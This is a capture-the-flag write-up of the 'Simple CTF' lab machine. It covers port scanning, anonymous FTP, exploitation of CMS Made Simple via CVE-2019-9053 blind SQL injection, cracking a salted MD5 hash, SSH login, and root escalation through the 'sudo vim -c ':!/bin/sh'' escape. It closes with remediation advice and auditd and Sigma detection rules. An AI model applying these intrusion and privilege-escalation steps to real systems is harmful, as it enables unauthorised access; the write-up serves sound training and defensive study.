# Simple CTF - Web Application Exploitation & Privilege Escalation via Sudo Misconfiguration

**Platform:** THM | **Target OS:** Linux (Ubuntu 16.04) | **Difficulty:** Easy  
**Focus:** Anonymous FTP Reconnaissance, Time-Based Blind SQL Injection (CVE-2019-9053), Credential Cracking, Sudoers Privilege Escalation (`vim`)

---

## 1. Executive Summary & Attack Chain

During this security assessment, an end-to-end compromise of the target system (`10.129.158.29`) was conducted. The assessment simulated an external threat actor with zero prior domain knowledge (Black-Box approach).

The attack path was established through four clear phases:
1. **Reconnaissance & Passive Information Gathering:** Scanning the perimeter revealed an insecure Anonymous FTP service hosting an internal communication file (`ForMitch.txt`), revealing the target username (`mitch`) and noting credential reuse practices.
2. **Web Footprinting & Discovery:** Web directory brute-forcing uncovered a Content Management System instance—**CMS Made Simple version 2.2.8**—located at `/simple/`.
3. **Initial Access via Time-Based Blind SQLi (CVE-2019-9053):** A known unauthenticated time-based blind SQL injection flaw in the CMS module allowed automated extraction of database entries, revealing system user credentials (`mitch`) and an MD5-salted password hash. The hash was subsequently cracked locally, yielding plaintext password `secret`, granting remote shell access via OpenSSH running on non-standard port `2222`.
4. **Privilege Escalation via Sudo Misconfiguration:** Local privilege auditing revealed that user `mitch` held `sudo` privileges to execute `/usr/bin/vim` as `root` without password authentication (`NOPASSWD`). By leveraging Vim's integrated shell execution capabilities, execution context was elevated directly to user `root` (UID 0), culminating in total host takeover.

### Attack Kill-Chain Diagram
```text
[ Anonymous FTP (Port 21) ] ──> Identified User "mitch" & Credential Weakness
            │
            ▼
[ Web Enumeration (Port 80) ] ─> Discovered CMS Made Simple v2.2.8 (/simple/)
            │
            ▼
[ Exploit CVE-2019-9053 ] ─────> Time-Based Blind SQLi -> Password Hash & Salt Extraction
            │
            ▼
[ Hash Cracking ] ─────────────> Recovered Plaintext Password: "secret"
            │
            ▼
[ SSH Access (Port 2222) ] ────> Shell Access as User: mitch (UID 1000)
            │
            ▼
[ Sudo Misconfiguration ] ─────> 'sudo /usr/bin/vim' -> Spawn Root Shell (UID 0)
```

---

## 2. Network Reconnaissance & Surface Mapping

### Nmap Port Scan
An initial active network scan was executed against the target using standard service versioning and default scripts:

```bash
❯ nmap -sV -sC -T4 10.129.158.29
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-08 03:04 +0300
Nmap scan report for 10.129.158.29
Host is up (0.059s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.192.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.16 seconds
```

### Scan Analysis & OPSEC Insights
- **Port 21 (vsftpd 3.0.3):** The FTP server permits anonymous access (`ftp:anonymous`). Default directory listing timed out inside the automated Nmap script, requiring an interactive session under Passive/Active mode calibration.
- **Port 80 (Apache 2.4.18):** Standard web server displaying default Ubuntu installation page; `robots.txt` disclosed disallowed paths (`/openemr-5_0_1_3`).
- **Port 2222 (OpenSSH 7.2p2):** The administrative SSH listener was relocated from standard port `22` to `2222`—a defense-by-obscurity control that does not mitigate targeted enumeration or brute-force threats.

---

## 3. Initial Access & CVE-2019-9053 Exploitation

### FTP Enumeration & Human Intelligence (OSINT/HumINT)
Interacting with the FTP listener revealed an unauthenticated public directory:

```text
❯ ftp 10.129.158.29
Connected to 10.129.158.29.
220 (vsFTPd 3.0.3)
Name (10.129.158.29:0xZiki): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pib
550 Failed to change directory.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.0001 seconds (2.7768 Mbytes/s)
ftp> bye
221 Goodbye.
```

Inspecting `ForMitch.txt`:
```bash
░▒▓ 💀 0xZiki   arch     ⏱ 31s
 󰄬 ❯ cat ForMitch.txt
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

**Key Findings:**
1. Valid username: `mitch`.
2. Explicit confirmation of poor password complexity and credential reuse across web and OS tiers.

### Web Content Enumeration
Running Gobuster against the HTTP interface identified a hidden software installation:

```text
	❯ gobuster dir -u http://10.129.158.29 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.158.29
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.php             (Status: 403) [Size: 296]
.hta                 (Status: 403) [Size: 292]
.hta.txt             (Status: 403) [Size: 296]
.hta.html            (Status: 403) [Size: 297]
.htaccess.php        (Status: 403) [Size: 301]
.htaccess            (Status: 403) [Size: 297]
.htaccess.txt        (Status: 403) [Size: 301]
.htaccess.html       (Status: 403) [Size: 302]
.htpasswd.php        (Status: 403) [Size: 301]
.htpasswd            (Status: 403) [Size: 297]
.htpasswd.txt        (Status: 403) [Size: 301]
.htpasswd.html       (Status: 403) [Size: 302]
index.html           (Status: 200) [Size: 11321]
index.html           (Status: 200) [Size: 11321]
robots.txt           (Status: 200) [Size: 929]
robots.txt           (Status: 200) [Size: 929]
server-status        (Status: 403) [Size: 301]
simple               (Status: 301) [Size: 315] [--> http://10.129.158.29/simple/]
Progress: 19004 / 19004 (100.00%)
===============================================================
Finished
===============================================================
```

Navigating to `http://10.129.158.29/simple/` displayed:
> *"This site is powered by CMS Made Simple version 2.2.8"*

### Mechanics of CVE-2019-9053
CMS Made Simple versions `< 2.2.10` contain an unauthenticated SQL injection vulnerability within the `News` module (specifically through parameters passed to search/admin endpoints, such as `m1_idlist`). Because database error messages are suppressed and results are not directly reflected in the HTTP response body, extraction must rely on **Time-Based Blind SQL Injection**.

The attacker constructs conditional payloads utilizing SQL functions such as `IF(condition, SLEEP(t), 0)`. The backend evaluates character-by-character:
$$\text{ASCII value comparison: } \text{MID}((\text{SELECT password FROM cms\_users}), i, 1) = \text{char}$$
If the evaluated condition evaluates to `TRUE`, the database process sleeps for $t$ seconds before completing the HTTP response; if `FALSE`, it returns instantly. By measuring response times over TCP round-trips, the full string is enumerated bit-by-bit.

### Exploit Refactoring & Extraction
The public exploit (`46635.py`) is written in legacy Python 2. Syntax refactoring was performed on-the-fly using `2to3` via `uvx`:

```bash
uvx --from 2to3 2to3 -w 46635.py
```

*Under the Hood:* `2to3` rewrote deprecated functions (such as parsing `print` statements into functional calls `print()`, updating `urllib` / `urllib2` module namespaces, and handling string-to-byte encoding changes mandatory in Python 3 runtime engines).

Running the updated exploit yielded the credentials:

```text
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] password cracked: secret
```

The hashing implementation matches:
$$\text{hash} = \text{MD5}(\text{salt} \parallel \text{plaintext})$$
The offline dictionary attack against `0c01f4468bd75d7a84c7eb73846e8d96` with salt `1dac0d92e9fa6bb2` verified the plaintext: `secret`.

---

## 4. Lateral Movement / Local Enumeration

Leveraging the obtained credentials over SSH on non-standard port `2222`:

```text
 ssh mitch@10.129.158.29 -p 2222
The authenticity of host '[10.129.158.29]:2222 ([10.129.158.29]:2222)' can't be established.
ED25519 key fingerprint is: SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.129.158.29]:2222' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
mitch@10.129.158.29's password:
Permission denied, please try again.
mitch@10.129.158.29's password:
Permission denied, please try again.
mitch@10.129.158.29's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!
$ cd ..
$ ls
mitch  sunbath
$ cd sunbath
-sh: 5: cd: can't cd to sunbath
```

### Local Context Findings
- **Current User Context:** `mitch` (UID: 1000, GID: 1000).
- **Secondary User Discovered:** `sunbath` resides in `/home/sunbath`, with permissions restricted (`drwx------`), preventing `mitch` traversal.
- **User Flag Captured:** `user.txt` in `/home/mitch/`.

---

## 5. Privilege Escalation & OS Mechanics

### Sudoers Inspection
Evaluating binary privileges delegated via `/etc/sudoers`:

```text
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$ whoami
mitch
$ sudo /bin/sh
[sudo] password for mitch:
Sorry, user mitch is not allowed to execute '/bin/sh' as root on Machine.
```

### Theoretical Mechanics: Vim Shell Escape & UID Inheritance
In Linux, process execution privileges are governed by Real User ID (**RUID**), Effective User ID (**EUID**), and Saved User ID (**SUID**). When a command is launched via `sudo`:
1. The `sudo` binary validates the entry in `/etc/sudoers`.
2. Upon authorization, `sudo` sets the EUID and RUID to `0` (`root`) via `setresuid(0, 0, 0)`.
3. It executes the target binary (`/usr/bin/vim`) via `execve()`.

`vim` includes an internal ex-command system (`:!`) designed to shell out to external commands without closing the editor. When invoked as:
```bash
sudo vim -c ':!/bin/sh'
```
The following occurs under the hood:
- The `-c` flag forces Vim to execute the post-load ex-command `:!/bin/sh`.
- Vim performs a standard `fork()` followed by `execve("/bin/sh", ...)`.
- Because Vim itself was spawned by `sudo` with `EUID=0` and `RUID=0`, the newly spawned `/bin/sh` inherits the parent process execution credentials without privilege dropping (unlike interpreters that check for mismatched RUID/EUID states or drop elevated tokens).

### Execution & Host Takeover

```text
$ sudo vim -c ':!/bin/sh'

# whoami
root
# ls
mitch  sunbath
# cd sunbath
# ls
Desktop  Documents  Downloads  examples.desktop  Music	Pictures  Public  Templates  Videos
# cd /root
# ls
root.txt
# cat root.txt
W3ll d0n3. You made it!
```

Root ownership of the host was confirmed, and `/root/root.txt` was extracted successfully.

---

## 6. Defensive Remediation & Detection Engineering

### Remediation Strategies

| Vulnerability / Finding | Risk Level | Mitigation Action |
| :--- | :--- | :--- |
| **CVE-2019-9053 (CMS Made Simple)** | **Critical** | Upgrade CMS Made Simple to version `2.2.10` or newer. Parameterize all SQL queries using Prepared Statements via PDO. |
| **Insecure Sudo Privileges (`vim`)** | **High** | Remove `/usr/bin/vim` from `/etc/sudoers`. If file editing is strictly necessary, utilize `sudoedit` (`sudo -e`), which copies the file to a temporary directory and prevents arbitrary binary/shell spawning. |
| **Anonymous FTP Access** | **Medium** | Disable anonymous logins in `/etc/vsftpd.conf`: set `anonymous_enable=NO`. |
| **Weak Password / Credential Reuse** | **High** | Implement PAM password complexity requirements via `pam_pwquality` (minimum length, character classes) and mandate unique credentials across web applications and underlying OS accounts. |

---

### Detection Engineering

#### 1. Auditd Monitoring (Detecting Interactive Shells Spawned by Editors)
Add the following audit rules to `/etc/audit/rules.d/audit.rules` to alert when privileged text editors spawn subshells:

```text
-a always,exit -F arch=b64 -F ppid!=1 -F euid=0 -S execve -F exe=/bin/dash -k elevated_shell_spawn
-a always,exit -F arch=b64 -F ppid!=1 -F euid=0 -S execve -F exe=/bin/bash -k elevated_shell_spawn
-a always,exit -F arch=b64 -F ppid!=1 -F euid=0 -S execve -F exe=/bin/sh -k elevated_shell_spawn
```

#### 2. Sigma Rule (Suspicious Child Process of Vim via Sudo)
```yaml
title: Shell Spawned from Vim under Elevated Context
id: c6f50b44-9dc3-4a1e-8e8e-d9e29a3a1f11
status: experimental
description: Detects interactive shells launched as child processes of Vim executing with root privileges.
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    ParentImage|endswith:
      - '/vim'
      - '/vi'
    Image|endswith:
      - '/bin/sh'
      - '/bin/bash'
      - '/bin/dash'
    User: 'root'
  condition: selection
falsepositives:
  - Rare administrative scripting workflows.
level: high
tags:
  - attack.privilege_escalation
  - attack.t1548.003
```
